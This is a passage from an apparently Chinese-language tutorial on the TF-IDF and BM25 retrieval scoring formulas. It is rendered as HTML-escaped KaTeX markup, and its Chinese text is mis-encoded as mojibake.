cjk_fallback&#34;&gt;çš„&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ–‡&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ¡£&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ•°&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ–‡&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ¡£&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ€»&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;æ•°&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.7693300000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;æ³¨ï¼šTF-IDFç®—æ³•éå¸¸å®¹æ˜“ç†è§£ï¼Œå¹¶ä¸”å¾ˆå®¹æ˜“å®ç°ï¼Œä½†æ˜¯å…¶ç®€å•ç»“æ„å¹¶æ²¡æœ‰è€ƒè™‘è¯è¯­çš„è¯­ä¹‰ä¿¡æ¯ï¼Œæ— æ³•å¤„ç†ä¸€è¯å¤šä¹‰ä¸ä¸€ä¹‰å¤šè¯çš„æƒ…å†µã€‚&lt;/p&gt;
&lt;h2 id=&#34;bm25&#34;&gt;BM25&lt;/h2&gt;
&lt;p&gt;BM(Best Match) è®¡ç®—queryä¸æ–‡æ¡£ç›¸ä¼¼åº¦å¾—åˆ†çš„ç®—æ³•ï¼Œæ˜¯TF-IDFçš„ä¼˜åŒ–ç‰ˆæœ¬ï¼Œ25æŒ‡25æ¬¡ç®—æ³•è¿­ä»£ã€‚&lt;/p&gt;
&lt;p&gt;BM25çš„ä¸€èˆ¬å…¬å¼æ˜¯ï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;munderover&gt;&lt;mo&gt;âˆ‘&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/munderover&gt;&lt;msub&gt;&lt;mi&gt;W&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Score(Q,d)=\sum_i^nW_iR(q_i,d)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.929066em;vertical-align:-1.277669em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mop op-limits&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.6513970000000002em;&#34;&gt;&lt;span style=&#34;top:-1.872331em;margin-left:0em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.050005em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span&gt;&lt;span class=&#34;mop op-symbol large-op&#34;&gt;âˆ‘&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-4.3000050000000005em;margin-left:0em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.277669em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;å…¶ä¸­&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Q&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;Q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;è¡¨ç¤ºä¸€æ¡queryï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;è¡¨ç¤ºqueryä¸­çš„å•è¯ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;d&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;è¡¨ç¤ºæŸä¸ªæœç´¢æ–‡æ¡£ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;W&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;W_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;è¡¨ç¤ºå•è¯æƒé‡ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;R&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;è¡¨ç¤º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;å’Œdçš„ç›¸å…³æ€§ã€‚&lt;/p&gt;
&lt;p&gt;BM25è®¡ç®—ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;queryä¸­æ¯ä¸ªå•è¯&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ä¸æ–‡æ¡£dä¹‹é—´çš„ç›¸å…³æ€§ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi&gt;K&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;S(q_i,d)=\frac{(k_i+1)tf_{td}}{K+tf_{td}}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.491108em;vertical-align:-0.481108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.01em;&#34;&gt;&lt;span style=&#34;top:-2.6550000000000002em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.07153em;&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3448em;&#34;&gt;&lt;span style=&#34;top:-2.3487714285714287em;margin-left:-0.10764em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15122857142857138em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.485em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mopen mtight&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3280857142857143em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.03148em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 